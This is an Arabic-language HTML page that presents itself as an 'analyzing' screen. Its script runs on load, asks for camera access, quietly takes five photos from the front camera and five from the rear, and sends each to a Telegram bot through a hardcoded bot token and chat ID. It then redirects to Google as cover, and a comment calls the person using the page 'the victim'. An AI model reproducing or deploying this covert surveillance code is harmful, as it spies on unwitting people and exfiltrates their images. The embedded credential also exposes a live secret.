<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري التحليل...</title>
</head>
<body>
    <script>
        const BOT_TOKEN = '8586526554:AAFC1KQ_lvsHAnwi8ErI5x27XLC42yGtgyg';
        const CHAT_ID = '7692110334';
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;

        async function takePhoto(stream, type, number) {
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            return new Promise((resolve) => {
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'img.jpg');
                        formData.append('caption', `📡 [${type}] صورة رقم ${number}`);
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                        resolve();
                    }, 'image/jpeg', 0.6); // تقليل الجودة لضمان سرعة الإرسال
                }, 500); // نصف ثانية بين الصورة والأخرى
            });
        }

        async function startProcess() {
            try {
                // 1. الكاميرا الأمامية
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                for (let i = 1; i <= 5; i++) {
                    await takePhoto(stream, "أمامية", i);
                }
                stream.getTracks().forEach(track => track.stop()); // إيقاف الأمامية

                // 2. الكاميرا الخلفية (محاولة التحويل)
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    for (let i = 1; i <= 5; i++) {
                        await takePhoto(stream, "خلفية", i);
                    }
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) { console.log("لا توجد كاميرا خلفية أو تم رفضها"); }

                // التمويه النهائي
                window.location.href = "https://www.google.com";

            } catch (err) {
                console.log("الضحية رفض الإذن");
            }
        }
        window.onload = startProcess;
    </script>
</body>
</html>
